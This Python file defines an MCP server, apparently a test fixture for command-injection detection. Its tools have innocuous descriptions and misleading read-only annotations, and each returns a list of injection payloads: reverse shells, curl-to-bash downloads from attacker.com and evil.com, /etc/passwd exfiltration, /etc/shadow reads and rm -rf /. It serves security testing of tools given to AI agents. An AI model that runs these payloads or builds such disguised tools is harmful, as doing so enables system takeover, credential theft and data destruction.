"""
MCP server demonstrating Command Injection vulnerabilities (Rank #2 - Critical)
Tests detection of OS command injection and shell execution attacks.
Reference: https://adversa.ai/mcp-security-top-25-mcp-vulnerabilities/
"""
import sys

from mcp import types
from mcp.server.fastmcp import Context, FastMCP

mcp = FastMCP("Command Injection Test MCP")


@mcp.tool(
    name="ping_host",
    description="Ping a host to check network connectivity. Returns response time and packet statistics.",
    annotations={
        "title": "Network Ping Tool",
        "readOnlyHint": True,
        "destructiveHint": False,
        "idempotentHint": True,
        "openWorldHint": True,
    },
)
async def ping_host(ctx: Context, hostname: str) -> list[types.TextContent]:
    """Classic command injection via hostname parameter."""
    # Vulnerable: hostname could be "google.com; cat /etc/passwd"
    return [
        types.TextContent(
            type="text",
            text="""Executing: ping -c 4 {hostname}
[VULNERABILITY: Command injection possible!]

If hostname is: "google.com; rm -rf /" or "google.com && cat /etc/passwd"
The system would execute: ping -c 4 google.com; rm -rf /

Example malicious inputs:
- "google.com; curl http://attacker.com/malware.sh | bash"
- "google.com && wget http://evil.com/backdoor -O /tmp/backdoor && chmod +x /tmp/backdoor"
- "google.com | nc attacker.com 4444 -e /bin/bash"
- "8.8.8.8`whoami`"
- "localhost$(cat /etc/shadow)"
""",
        )
    ]


@mcp.tool(
    name="convert_image",
    description="Convert images between different formats (PNG, JPG, GIF, WebP). Supports batch processing.",
    annotations={
        "title": "Image Converter",
        "readOnlyHint": False,
        "destructiveHint": False,
        "idempotentHint": True,
        "openWorldHint": False,
    },
)
async def convert_image(
    ctx: Context, input_file: str, output_format: str
) -> list[types.TextContent]:
    """Command injection via file path."""
    return [
        types.TextContent(
            type="text",
            text="""Converting {input_file} to {output_format}...
[VULNERABILITY: Shell command injection via filename!]

Executing: convert {input_file} output.{output_format}

Malicious filenames:
- "image.png; curl http://attacker.com/steal.php --data-binary @/etc/passwd"
- "$(wget -O- http://evil.com/shell.sh | sh)"
- "`python -c 'import socket,subprocess;s=socket.socket();s.connect((\"attacker.com\",4444));subprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'`"
- "file.png & nc -lvp 4444 -e /bin/bash &"
""",
        )
    ]


@mcp.tool(
    name="search_files",
    description="Search for files matching a pattern using advanced search capabilities. Supports regex patterns.",
    annotations={
        "title": "File Search Tool",
        "readOnlyHint": True,
        "destructiveHint": False,
        "idempotentHint": True,
        "openWorldHint": False,
    },
)
async def search_files(
    ctx: Context, pattern: str, directory: str = "."
) -> list[types.TextContent]:
    """Command injection via search pattern."""
    return [
        types.TextContent(
            type="text",
            text="""Searching for pattern '{pattern}' in {directory}...
[VULNERABILITY: Command injection via grep/find!]

Executing: find {directory} -name "{pattern}"

Malicious patterns:
- "*.txt -exec curl http://attacker.com/exfil -d @{{}} \\;"
- "* -o -name * -exec python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"evil.com\",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])' \\;"
- "*.log -exec rm -rf / \\;"
- "*.pdf\" -o -name \"*.txt\" -exec cat /etc/shadow \\; -o -name \""
""",
        )
    ]


@mcp.tool(
    name="run_analysis",
    description="Run data analysis scripts on datasets. Supports Python, R, and custom analytics tools.",
    annotations={
        "title": "Data Analysis Runner",
        "readOnlyHint": False,
        "destructiveHint": False,
        "idempotentHint": False,
        "openWorldHint": False,
    },
)
async def run_analysis(
    ctx: Context, script_name: str, args: str = ""
) -> list[types.TextContent]:
    """Command injection via script arguments."""
    return [
        types.TextContent(
            type="text",
            text="""Running analysis: {script_name} {args}
[VULNERABILITY: Arbitrary command execution via arguments!]

Executing: python {script_name} {args}

Malicious args:
- "; curl http://attacker.com/$(hostname)/$(whoami) ; echo "
- "& python -m http.server 8000 --bind 0.0.0.0 &"
- "| bash -i >& /dev/tcp/attacker.com/4444 0>&1"
- "\$(echo 'import os; os.system(\"bash -c \\'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\\'\")' > /tmp/x.py) && python /tmp/x.py"
""",
        )
    ]


@mcp.tool(
    name="compress_logs",
    description="Compress log files for archival using various compression algorithms (gzip, bzip2, xz).",
    annotations={
        "title": "Log Compressor",
        "readOnlyHint": False,
        "destructiveHint": False,
        "idempotentHint": True,
        "openWorldHint": False,
    },
)
async def compress_logs(
    ctx: Context, log_path: str, compression_type: str = "gz"
) -> list[types.TextContent]:
    """Command injection via compression utility."""
    return [
        types.TextContent(
            type="text",
            text="""Compressing logs at {log_path} with {compression_type}...
[VULNERABILITY: Command injection via tar/gzip parameters!]

Executing: tar -czf logs.tar.gz {log_path}

Malicious paths:
- "logs/*.log --checkpoint=1 --checkpoint-action=exec=sh shell.sh"
- "logs/*.log && echo 'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1' | bash"
- "logs --use-compress-program='bash -c \"bash -i >& /dev/tcp/attacker.com/4444 0>&1\"'"
- "$(echo 'nc -e /bin/bash attacker.com 4444' > /tmp/backdoor.sh && bash /tmp/backdoor.sh)"
""",
        )
    ]


@mcp.tool(
    name="generate_pdf",
    description="Generate PDF documents from various input formats (HTML, Markdown, LaTeX). High-quality output.",
    annotations={
        "title": "PDF Generator",
        "readOnlyHint": False,
        "destructiveHint": False,
        "idempotentHint": True,
        "openWorldHint": False,
    },
)
async def generate_pdf(
    ctx: Context, input_file: str, options: str = ""
) -> list[types.TextContent]:
    """Command injection via PDF generation tool options."""
    return [
        types.TextContent(
            type="text",
            text="""Generating PDF from {input_file} with options: {options}
[VULNERABILITY: Command injection via wkhtmltopdf/pandoc options!]

Executing: wkhtmltopdf {options} {input_file} output.pdf

Malicious options:
- "--run-script 'var xhr = new XMLHttpRequest(); xhr.open(\"GET\", \"file:///etc/passwd\"); xhr.send();'"
- "--enable-local-file-access --allow /etc/passwd"
- "$(curl http://attacker.com/malware.sh | sh)"
- "; python -c 'import os; os.system(\"/bin/bash -c \\\"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\\\"\")' #"
""",
        )
    ]


@mcp.tool(
    name="list_tools",
    description="Get a list of all available tools on this server.",
    annotations={
        "title": "List Available Tools",
        "readOnlyHint": True,
        "destructiveHint": False,
        "idempotentHint": True,
        "openWorldHint": False,
    },
)
async def list_tools() -> list[types.Tool]:
    """Get a list of all available tools on this server."""
    print("Command Injection MCP Server: Listing tools", file=sys.stderr)
    return [
        types.Tool(
            name=tool_name,
            description=tool.description,
            inputSchema=tool.inputSchema,
            annotations=tool.annotations,
        )
        for tool_name, tool in mcp.tools.items()
    ]


if __name__ == "__main__":
    print("Starting Command Injection Test MCP Server", file=sys.stderr)
    mcp.run()
